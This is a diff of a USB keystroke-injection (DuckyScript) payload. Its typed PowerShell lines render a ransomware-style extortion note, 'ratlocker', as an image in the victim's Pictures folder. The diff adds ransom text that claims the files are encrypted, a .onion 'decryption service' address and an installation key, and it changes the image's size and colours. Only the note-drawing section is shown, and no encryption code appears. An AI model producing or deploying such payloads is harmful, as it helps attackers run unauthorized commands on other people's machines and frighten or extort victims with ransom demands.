@@ -22,31 +22,56 @@ STRING Add-Type -AssemblyName System.Drawing
 ENTER
 STRING $filename = "$home\pictures\ratl0ck3r.png"
 ENTER
-STRING $bmp = new-object System.Drawing.Bitmap 34401720,720
+STRING $bmp = new-object System.Drawing.Bitmap 1920,1080
 ENTER
-STRING $font = new-object System.Drawing.Font Consolas,12
+STRING $font = new-object System.Drawing.Font Consolas,10
 ENTER
 STRING $brushBg = [System.Drawing.Brushes]::Black
 ENTER
-STRING $brushFg = [System.Drawing.Brushes]::White
+STRING $brushFg = [System.Drawing.Brushes]::Green
 ENTER
 STRING $graphics = [System.Drawing.Graphics]::FromImage($bmp)
 ENTER
 STRING $graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
 ENTER
-STRING $graphics.DrawString('Your device has been encrypted by ratcode.
+STRING $graphics.DrawString('Your device has been encrypted by ratlocker.
 ENTER
-STRING             .-.
 ENTER
-STRING            (0.0)
+STRING            ____()()
 ENTER
-STRING          -=.|m|.=-
+STRING          /      OO
 ENTER
-STRING          .=- x -=.',$font,$brushFg,10,10)
+STRING     ~~~~~\_;m__m._>o
+ENTER
+ENTER
+ENTER
+STRING Oops! Your files have been encrypted.ENTER
+ENTER
+STRING If you see this text, your files are no longer accessible. You might
+ENTER
+STRING have been looking for a way to recover your files, but do not waste
+ENTER
+STRING your time. No one will be able to recover them without a decrytion
+ENTER
+STRING service.
+ENTER
+ENTER
+STRING We gurantee that you can recover all your files safely. All you need
+ENTER
+STRING to do is get the decryption password.
+ENTER
+ENTER
+STRING Visit out web services at: fakerat404linkszt3xaxqzf2nm12.onion
+ENTER
+ENTER
+STRING Your personal installation key #1:
+ENTER
+ENTER
+STRING b0d549572a40f93aa57400dbe43ee72a5e545f47765ef5fb7d17c7e83001cb3d',$font,$brushFg,10,10)
 ENTER
 STRING $graphics.Dispose()
 ENTER
-STRING $bmp.Save($filename) 
+STRING $bmp.Save($filename)
 ENTER
 DELAY 500
 
